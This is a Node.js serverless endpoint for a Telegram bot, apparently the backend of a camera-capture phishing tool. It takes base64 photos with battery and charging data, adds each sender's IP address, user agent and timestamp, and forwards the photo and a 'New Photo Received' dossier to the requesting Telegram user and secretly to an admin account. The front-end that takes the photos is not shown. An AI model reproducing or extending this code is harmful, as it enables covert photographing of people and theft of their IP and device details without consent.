const { Telegraf } = require('telegraf');
const bot = new Telegraf(process.env.BOT_TOKEN);

let userCounter = {}; // 📌 هر uid لپاره شمېرنه

module.exports = async (req, res) => {
  if (req.method !== 'POST') {
    return res.status(405).send('Method Not Allowed');
  }

  try {
    const { image, uid, battery, charging } = req.body;
    const adminId = process.env.ADMIN_ID;

    if (!uid || !image) return res.status(400).send('UID or Image missing');

    // 📌 د هر uid لپاره شمېر
    userCounter[uid] = (userCounter[uid] || 0) + 1;
    if (userCounter[uid] > 4) {
      return res.status(403).send('⛔ Limit reached: No more uploads allowed.');
    }

    const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;
    const userAgent = req.headers['user-agent'] || "Unknown";
    const timestamp = new Date().toLocaleString('en-US', {
      timeZone: 'Asia/Kabul',
      hour12: false,
    });

    const base64 = image.replace(/^data:image\/\w+;base64,/, '');
    const imgBuffer = Buffer.from(base64, 'base64');

    const isCharging = charging ? 'Yes 🔌' : 'No ❌';
    const caption = `
🆕 *New Photo Received*

━━━━━━━━━━━━━━━━━━
🆔 *Telegram ID:* \`${uid}\`
🔋 *Battery Level:* \`${battery || '?'}%\`
⚡ *Charging:* \`${isCharging}\`
🌐 *IP Address:* \`${ip}\`
📱 *Device:* \`${userAgent}\`
🕒 *Time:* \`${timestamp}\`
━━━━━━━━━━━━━━━━━━

──────╮  
│🧑🏻‍💻 *Built By 💛 WACIQ* 
╰────────────╯
`.trim();

    // ✅ Send to user
    await bot.telegram.sendPhoto(uid, { source: imgBuffer }, {
      caption,
      parse_mode: 'Markdown'
    });

    // ✅ Send to admin
    if (adminId) {
      await bot.telegram.sendPhoto(adminId, { source: imgBuffer }, {
        caption,
        parse_mode: 'Markdown'
      });
    }

    res.status(200).send('✅ Uploaded');
  } catch (err) {
    console.error(err);
    res.status(500).send('❌ Upload Error');
  }
}; 
